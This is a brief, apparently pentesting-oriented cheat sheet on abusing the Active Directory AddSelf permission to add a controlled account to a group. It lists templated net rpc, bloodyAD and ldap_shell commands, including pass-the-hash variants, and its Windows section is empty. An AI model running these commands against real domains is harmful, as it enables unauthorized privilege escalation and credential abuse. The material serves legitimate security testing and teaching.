# Abusing AddSelf

If an user have AddSelf over a group can add itself inside the group. This can be done with multiple tools.

### From Linux (enternally):

Samba tools -> `net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'<password>' -S '<dc-ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p '<password>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

With PASS THE HASH option:

Samba tools -> `pth-net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'LMhash':'NThash' -S '<dc ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p ':<nt_hash>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes ffffffffffffffffffffffffffffffff:<nt_hash> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

### From Windows (internally):







